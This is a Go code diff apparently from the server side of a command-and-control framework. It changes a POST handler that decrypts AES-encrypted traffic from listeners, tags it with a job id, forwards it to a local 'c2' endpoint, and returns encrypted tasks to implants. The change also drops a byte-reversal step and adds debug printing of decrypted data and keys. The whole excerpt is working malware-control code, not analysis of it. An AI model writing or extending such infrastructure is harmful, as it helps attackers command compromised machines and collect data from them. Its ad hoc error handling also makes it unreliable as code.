@@ -9,6 +9,7 @@ import (
 	"net"
 	"net/http"
 	"reflect"
+	"strconv"
 	"strings"
 )
 
@@ -104,17 +105,40 @@ func POST_handler(body []byte, listener *Listener, r *http.Request, w http.Respo
 					return res, true // sleep
 				} else {
 					res = append(res, make_fucker(listener, i)...)
+
+					printkey(res)
+
 					res = eAES.EncryptData(res)
-					return ReverseBytes(res), true
+					return res, true
 				}
 			} else {
-				json_byte, _ := eAES.DecryptData(GetBytes(body, len(body)))
+				json_byte, err := eAES.DecryptData(GetBytes(body, len(body)))
+				if !err {
+					println("not de ")
+				}
+				println(string(json_byte))
 				remove_job(listener, i)
-				json_byte = append(json_byte, 0x00, IntToUint8(i))
+
+				var jsonObj map[string]interface{}
+				json.Unmarshal(json_byte, &jsonObj)
+				jsonObj["c2"] = strconv.Itoa(i)
+				newJsonStr, _ := json.Marshal(jsonObj)
+				json_byte = append(newJsonStr)
+
+				println(string(json_byte))
+
 				Send_Bytes_to(w, json_byte, "http://localhost:50049/c2", expectedHeaders)
-				res = append(res, make_fucker(listener, i)...)
-				res = eAES.EncryptData(res)
-				return res, true // commit
+
+				if is_jobs_null(listener, i) {
+					return res, true // sleep
+				} else {
+					res = append(res, make_fucker(listener, i)...)
+
+					printkey(res)
+
+					res = eAES.EncryptData(res)
+					return res, true
+				}
 			}
 
 		} else {
